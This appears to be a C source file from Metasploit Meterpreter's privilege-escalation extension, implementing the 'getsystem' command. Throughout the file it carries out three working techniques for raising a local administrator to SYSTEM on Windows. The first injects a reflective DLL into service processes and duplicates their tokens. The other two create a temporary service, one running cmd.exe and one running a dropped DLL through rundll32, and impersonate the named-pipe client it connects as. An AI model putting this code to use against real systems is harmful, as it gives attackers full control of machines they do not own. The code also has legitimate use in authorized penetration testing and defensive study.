#include "precomp.h"
#include "elevate.h"
#include "service.h"
#include "../../../../ReflectiveDLLInjection/LoadLibraryR.h"

#define ELEVATE_TECHNIQUE_NONE					-1
#define ELEVATE_TECHNIQUE_ANY					0
#define ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE		1
#define ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2	2
#define ELEVATE_TECHNIQUE_SERVICE_TOKENDUP		3
#define ELEVATE_TECHNIQUE_VULN_KITRAP0D			4

// Simple macros to close a handle and set the handle to NULL.
#define CLOSE_SERVICE_HANDLE( h )	if( h ) { CloseServiceHandle( h ); h = NULL; }
#define CLOSE_HANDLE( h )			if( h ) { CloseHandle( h ); h = NULL; }

/*
 * Enable or disable a privilege in our processes current token.
 */
BOOL elevate_priv( char * cpPrivilege, BOOL bEnable )
{
	DWORD dwResult        = ERROR_SUCCESS;
	HANDLE hToken         = NULL;
	TOKEN_PRIVILEGES priv = {0};

	do
	{
		if( !cpPrivilege )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_priv. invalid arguments", ERROR_BAD_ARGUMENTS );

		if( !OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_priv. OpenProcessToken failed" );
		
		priv.PrivilegeCount = 1;

		if( bEnable )
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		else
			priv.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

		if( !LookupPrivilegeValue( NULL, cpPrivilege, &priv.Privileges[0].Luid ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_priv. LookupPrivilegeValue failed" );

		if( !AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_priv. AdjustTokenPrivileges failed" );

	} while( 0 );
	
	CLOSE_HANDLE( hToken );

	SetLastError( dwResult );

	if( dwResult == ERROR_SUCCESS )
		return TRUE;

	return FALSE;
}

/*
 * Elevate from local admin to local system via code injection in a system service.
 * Does not work on NT4 (needed api's missing) Works on 2000, XP, 2003. On Vista, 2008 or 7 we cant open
 * service process from a non elevated admin.
 *
 * A current limitation in LoadRemoteLibraryR prevents this from working across 
 * architectures so we just filter out running this from an x64 process for now.
 */
DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
{
	DWORD dwResult                   = ERROR_SUCCESS;
	HANDLE hToken                    = NULL;
	HANDLE hTokenDup                 = NULL;
	HANDLE hProcess                  = NULL;
	HANDLE hThread                   = NULL;
	HANDLE hManager                  = NULL;
	HANDLE hService                  = NULL;
	LPVOID lpServiceBuffer           = NULL;
	LPVOID lpRemoteCommandLine       = NULL;
	ENUM_SERVICE_STATUS * lpServices = NULL;
	char * cpServiceName             = NULL;
	SERVICE_STATUS_PROCESS status    = {0};
	char cCommandLine[128]           = {0};
	OSVERSIONINFO os                 = {0};
	DWORD dwServiceLength            = 0;
	DWORD dwBytes                    = 0;
	DWORD index                      = 0;
	DWORD dwServicesReturned         = 0;
	DWORD dwExitCode                 = 0;
#ifdef _WIN64
	DWORD dwMeterpreterArch = 2;
#else
	DWORD dwMeterpreterArch = 1;
#endif

	do
	{
		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );

		if( !GetVersionEx( &os ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug: GetVersionEx failed" )

		// filter out Windows NT4 or running this from native x64
		if ( ( os.dwMajorVersion == 4 && os.dwMinorVersion == 0 ) || dwMeterpreterArch == 2 )
		{
			SetLastError( ERROR_ACCESS_DENIED );
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug: Not yet supported on this platform." )
		}

		cpServiceName   = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_NAME );
		dwServiceLength = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH );
		lpServiceBuffer = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_DLL );

		if( !dwServiceLength || !lpServiceBuffer )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_debug. invalid arguments", ERROR_BAD_ARGUMENTS );

		if( !elevate_priv( SE_DEBUG_NAME, TRUE ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. elevate_priv SE_DEBUG_NAME failed" );

		hManager = OpenSCManagerA( NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE );
		if( !hManager )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. OpenSCManagerA failed" );
		
		if( !EnumServicesStatus( hManager, SERVICE_WIN32, SERVICE_ACTIVE, NULL, 0, &dwBytes, &dwServicesReturned, NULL ) )
		{
			if( GetLastError() != ERROR_MORE_DATA )
				BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. EnumServicesStatus 1 failed" );
		}

		lpServices = (ENUM_SERVICE_STATUS *)malloc( dwBytes );
		if( !lpServices )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. malloc lpServices failed" );

		if( !EnumServicesStatus( hManager, SERVICE_WIN32, SERVICE_ACTIVE, lpServices, dwBytes, &dwBytes, &dwServicesReturned, NULL ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. EnumServicesStatus 2 failed" );
	
		dwResult = ERROR_ACCESS_DENIED;

		// we enumerate all services, injecting our elevator.dll (via RDI), if the injected thread returns successfully
		// it means we have been given a system token so we duplicate it as a primary token for use by metsrv.
		for( index=0 ; index<dwServicesReturned ; index++ )
		{
			do
			{
				hService = OpenServiceA( hManager, lpServices[index].lpServiceName, SERVICE_QUERY_STATUS ); 
				if( !hService )
					break;

				if( !QueryServiceStatusEx( hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(SERVICE_STATUS_PROCESS), &dwBytes ) )
					break;
				
				if( status.dwCurrentState != SERVICE_RUNNING )
					break;

				// open a handle to this service (assumes we have SeDebugPrivilege)...
				hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, status.dwProcessId );
				if( !hProcess )
					break;

				dprintf( "[ELEVATE] elevate_via_service_debug. trying [%d] lpDisplayName=%s, lpServiceName=%s, dwProcessId=%d", index, lpServices[index].lpDisplayName, lpServices[index].lpServiceName, status.dwProcessId  );
	
				_snprintf( cCommandLine, sizeof(cCommandLine), "/t:%d\x00", GetCurrentThreadId() );

				// alloc some space and write the commandline which we will pass to the injected dll...
				lpRemoteCommandLine = VirtualAllocEx( hProcess, NULL, strlen(cCommandLine)+1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE ); 
				if( !lpRemoteCommandLine )
					break; 

				if( !WriteProcessMemory( hProcess, lpRemoteCommandLine, cCommandLine, strlen(cCommandLine)+1, NULL ) )
					break;

				// use RDI to inject the elevator.dll into the remote process, passing in the command line to elevator.dll
				hThread = LoadRemoteLibraryR( hProcess, lpServiceBuffer, dwServiceLength, lpRemoteCommandLine );
				if( !hThread )
					break;

				// we will only wait 30 seconds for the elevator.dll to do its job, if this times out we assume it failed.
				if( WaitForSingleObject( hThread, 30000 ) != WAIT_OBJECT_0 )
					break;

				// get the exit code for our injected elevator.dll
				if( !GetExitCodeThread( hThread, &dwExitCode ) )
					break;

				// if the exit code was successfull we have been given a local system token, so we duplicate it
				// as a primary token for use by metsrv
				if( dwExitCode == ERROR_SUCCESS )
				{
					if( OpenThreadToken( GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken ) )
					{
						if( DuplicateTokenEx( hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup ) )
						{
							core_update_thread_token( remote, hTokenDup );
							dwResult = ERROR_SUCCESS;
							break;
						}
					}
				}

			} while( 0 );

			CLOSE_SERVICE_HANDLE( hService );

			CLOSE_HANDLE( hProcess );

			CLOSE_HANDLE( hThread );

			CLOSE_HANDLE( hToken );
			
			if( dwResult == ERROR_SUCCESS )
				break;
		}

	} while( 0 );

	CLOSE_SERVICE_HANDLE( hManager );

	if( lpServices )
		free( lpServices );

	SetLastError( dwResult );

	return dwResult;
}

/*
 * Worker thread for named pipe impersonation. Creates a named pipe and impersonates 
 * the first client which connects to it.
 */
DWORD THREADCALL elevate_namedpipe_thread( THREAD * thread )
{
	DWORD dwResult              = ERROR_ACCESS_DENIED;
	HANDLE hServerPipe          = NULL;
	HANDLE hToken               = NULL;
	char * cpServicePipe        = NULL;
	Remote * remote             = NULL;
	BYTE bMessage[128]          = {0};
	DWORD dwBytes               = 0;

	do
	{
		if( !thread )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_namedpipe_thread. invalid thread", ERROR_BAD_ARGUMENTS );

		cpServicePipe = (char *)thread->parameter1;
		remote        = (Remote *)thread->parameter2;

		if( !cpServicePipe || !remote )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_namedpipe_thread. invalid thread arguments", ERROR_BAD_ARGUMENTS );

		dprintf("[ELEVATE] pipethread. CreateNamedPipe(%s)",cpServicePipe);

		// create the named pipe for the client service to connect to
		hServerPipe = CreateNamedPipe( cpServicePipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL );
		if( !hServerPipe )
			BREAK_ON_ERROR( "[ELEVATE] elevate_namedpipe_thread. CreateNamedPipe failed" );

		while( TRUE )
		{
			if( event_poll( thread->sigterm, 0 ) )
				BREAK_WITH_ERROR( "[ELEVATE] elevate_namedpipe_thread. thread->sigterm received", ERROR_DBG_TERMINATE_THREAD );

			// wait for a client to connect to our named pipe...
			if( !ConnectNamedPipe( hServerPipe, NULL ) )
			{
				if( GetLastError() != ERROR_PIPE_CONNECTED )
					continue;
			}

			dprintf("[ELEVATE] pipethread. got client conn.");

			// we can't impersonate a client untill we have performed a read on the pipe...
			if( !ReadFile( hServerPipe, &bMessage, 1, &dwBytes, NULL ) )
				CONTINUE_ON_ERROR( "[ELEVATE] pipethread. ReadFile failed" );

			// impersonate the client!
			if( !ImpersonateNamedPipeClient( hServerPipe ) )
				CONTINUE_ON_ERROR( "[ELEVATE] elevate_namedpipe_thread. ImpersonateNamedPipeClient failed" );

			//WriteFile( hServerPipe, &bMessage, 1, &dwBytes, NULL );

			// get a handle to this threads token
			if( !OpenThreadToken( GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken ) )
				CONTINUE_ON_ERROR( "[ELEVATE] elevate_namedpipe_thread. OpenThreadToken failed" );

			// now we can set the meterpreters thread token to that of our system 
			// token so all subsequent meterpreter threads will use this token.
			core_update_thread_token( remote, hToken );

			dwResult = ERROR_SUCCESS;

			break;
		}

	} while( 0 );

	if( hServerPipe )
	{
		DisconnectNamedPipe( hServerPipe );
		CLOSE_HANDLE( hServerPipe );
	}

	dprintf( "[ELEVATE] elevate_namedpipe_thread finishing, dwResult=%d", dwResult );

	return dwResult;
}

/*
 * Elevate from local admin to local system via Named Pipe Impersonation. We spawn a cmd.exe under local 
 * system which then connects to our named pipe and we impersonate this client. This can be done by an 
 * Administrator without the need for SeDebugPrivilege.  Works on 2000, XP, 2003 and 2008 for all local 
 * administrators. On Vista and 7 it will only work if the host process has been elevated through UAC
 * first. Does not work on NT4.
 */
DWORD elevate_via_service_namedpipe( Remote * remote, Packet * packet )
{
	DWORD dwResult              = ERROR_SUCCESS;
	char * cpServiceName        = NULL;
	THREAD * pThread            = NULL;
	char cServiceArgs[MAX_PATH] = {0};
	char cServicePipe[MAX_PATH] = {0};
	OSVERSIONINFO os            = {0};

	do
	{
		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );

		if( !GetVersionEx( &os ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe: GetVersionEx failed" )

		// filter out Windows NT4
		if ( os.dwMajorVersion == 4 && os.dwMinorVersion == 0 )
		{
			SetLastError( ERROR_ACCESS_DENIED );
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe: Windows NT4 not supported." )
		}

		cpServiceName = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_NAME );
		if( !cpServiceName )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. invalid arguments", ERROR_BAD_ARGUMENTS );

		_snprintf( cServicePipe, MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName );
		
		_snprintf( cServiceArgs, MAX_PATH, "cmd.exe /c echo %s > %s", cpServiceName, cServicePipe );

		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote );
		if( !pThread )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. thread_create failed", ERROR_INVALID_HANDLE );

		if( !thread_run( pThread ) )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. thread_run failed", ERROR_ACCESS_DENIED );

		Sleep( 500 ); // to-do: use signals to synchronize when the named pipe server is ready...

		// start the elevator service (if it doesnt start first time we need to create it and then start it).
		if( service_start( cpServiceName ) != ERROR_SUCCESS )
		{
			if( service_create( cpServiceName, cServiceArgs ) != ERROR_SUCCESS )
				BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe. service_create failed" );
			// we dont check a return value for service_start as we expect it to fail as cmd.exe is not
			// a valid service and it will never signal to the service manager that is is a running service.
			service_start( cpServiceName );
		}

		// signal our thread to terminate if it is still running
		thread_sigterm( pThread );
		
		// and wait for it to terminate...
		thread_join( pThread );

		// get the exit code for our pthread
		if( !GetExitCodeThread( pThread->handle, &dwResult ) )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. GetExitCodeThread failed", ERROR_INVALID_HANDLE );
		
	} while( 0 );

	if( cpServiceName )
	{
		service_stop( cpServiceName );
		service_destroy( cpServiceName );
	}

	if( pThread )
		thread_destroy( pThread );

	return dwResult;
}

/*
 * Elevate from local admin to local system via Named Pipe Impersonation. We spawn a service under local 
 * system which then connects to our named pipe and we impersonate this client. This can be done by an 
 * Administrator without the need for SeDebugPrivilege, however a dll (elevator.dll) must be written to 
 * disk. Works on NT4, 2000, XP, 2003 and 2008 for all local administrators. On Vista and 7 it will only 
 * work if the host process has been elevated through UAC first.
 */
DWORD elevate_via_service_namedpipe2( Remote * remote, Packet * packet )
{
	DWORD dwResult              = ERROR_SUCCESS;
	THREAD * pThread            = NULL;
	HANDLE hServiceFile         = NULL;
	LPVOID lpServiceBuffer      = NULL;
	char * cpServiceName        = NULL;
	THREAD * pthread            = NULL;
	char cServicePath[MAX_PATH] = {0};
	char cServiceArgs[MAX_PATH] = {0};
	char cServicePipe[MAX_PATH] = {0};
	char cTempPath[MAX_PATH]    = {0};
	DWORD dwBytes               = 0;
	DWORD dwTotal               = 0;
	DWORD dwServiceLength       = 0;

	do
	{
		cpServiceName   = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_NAME );
		dwServiceLength = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH );
		lpServiceBuffer = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_DLL );

		if( !cpServiceName || !dwServiceLength || !lpServiceBuffer )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. invalid arguments", ERROR_BAD_ARGUMENTS );

		if( GetTempPath( MAX_PATH, (LPSTR)&cTempPath ) == 0 )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. GetTempPath failed" );

		if( cTempPath[ strlen(cTempPath) - 1 ] == '\\' )
			_snprintf( cServicePath, MAX_PATH, "%s%s.dll", cTempPath, cpServiceName );
		else
			_snprintf( cServicePath, MAX_PATH, "%s\\%s.dll", cTempPath, cpServiceName );

		_snprintf( cServiceArgs, MAX_PATH, "rundll32.exe %s,a /p:%s", cServicePath, cpServiceName );
		
		_snprintf( cServicePipe, MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName );

		// write service dll to temp path...
		hServiceFile = CreateFile( cServicePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
		if( !hServiceFile )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. CreateFile hServiceFile failed" );
		
		while( dwTotal < dwServiceLength )
		{
			if( !WriteFile( hServiceFile, (LPCVOID)((LPBYTE)lpServiceBuffer + dwTotal), (dwServiceLength - dwTotal), &dwBytes, NULL ) )
				break;
			dwTotal += dwBytes;
		}
		
		CLOSE_HANDLE( hServiceFile );

		if( dwTotal != dwServiceLength )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. WriteFile hServiceFile failed", ERROR_BAD_LENGTH );

		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote );
		if( !pThread )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. thread_create failed", ERROR_INVALID_HANDLE );

		if( !thread_run( pThread ) )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. thread_create failed", ERROR_ACCESS_DENIED );

		Sleep( 500 );

		// start the elevator service (if it doesnt start first time we need to create it and then start it).
		if( service_start( cpServiceName ) != ERROR_SUCCESS )
		{
			if( service_create( cpServiceName, cServiceArgs ) != ERROR_SUCCESS )
				BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. service_create failed" );

			if( service_start( cpServiceName ) != ERROR_SUCCESS )
				BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. service_start failed" );
		}
	
		WaitForSingleObject( pThread->handle, 10000 );

		thread_sigterm( pThread );
		
		thread_join( pThread );

		// get the exit code for our pthread
		if( !GetExitCodeThread( pThread->handle, &dwResult ) )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. GetExitCodeThread failed", ERROR_INVALID_HANDLE );
		
	} while( 0 );

	if( cpServiceName )
	{
		service_stop( cpServiceName );
		service_destroy( cpServiceName );
	}

	if( strlen( cServicePath ) > 0 )
	{
		DWORD dwIndex = 20;
		while( dwIndex-- )
		{
			if( DeleteFile( cServicePath ) )
				break;
			Sleep( 500 );
		}
	}

	if( pThread )
		thread_destroy( pThread );

	return dwResult;
}

/*
 * Attempt to elevate the current meterpreter to local system using a variety of techniques.
 */
DWORD elevate_getsystem( Remote * remote, Packet * packet )
{
	DWORD dwResult    = ERROR_SUCCESS;
	DWORD dwTechnique = ELEVATE_TECHNIQUE_ANY;
	Packet * response = NULL;

	do
	{
		response = packet_create_response( packet );
		if( !response )
			BREAK_WITH_ERROR( "[ELEVATE] get_system. packet_create_response failed", ERROR_INVALID_HANDLE );

		dwTechnique = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_TECHNIQUE );
		
		// if we are to to use ELEVATE_TECHNIQUE_ANY, we try everything at our disposal...
		if( dwTechnique == ELEVATE_TECHNIQUE_ANY )
		{
			do
			{
				// firstly, try to use the in-memory named pipe impersonation technique
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE;
				dwResult    = elevate_via_service_namedpipe( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;

				// secondly, try to use the in-memory service token duplication technique (requires SeDebugPrivilege)
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_TOKENDUP;
				dwResult    = elevate_via_service_tokendup( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;

				// thirdly, try to use the touching disk named pipe impersonation technique
				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2;
				dwResult    = elevate_via_service_namedpipe2( remote, packet );
				if( dwResult == ERROR_SUCCESS )
					break;

			} while( 0 );
		}
		else
		{
			// if we are to only use a specific technique, try the specified one and return the success...
			switch( dwTechnique )
			{
				case ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE:
					dwResult = elevate_via_service_namedpipe( remote, packet );
					break;
				case ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2:
					dwResult = elevate_via_service_namedpipe2( remote, packet );
					break;
				case ELEVATE_TECHNIQUE_SERVICE_TOKENDUP:
					dwResult = elevate_via_service_tokendup( remote, packet );
					break;
				default:
					dwResult = ERROR_CALL_NOT_IMPLEMENTED;
					break;
			}
		}

	} while( 0 );

	if( response )
	{
		if( dwResult == ERROR_SUCCESS )
			packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE, dwTechnique );
		else
			packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE, ELEVATE_TECHNIQUE_NONE );

		packet_transmit_response( dwResult, remote, response );
	}

	return dwResult;
}
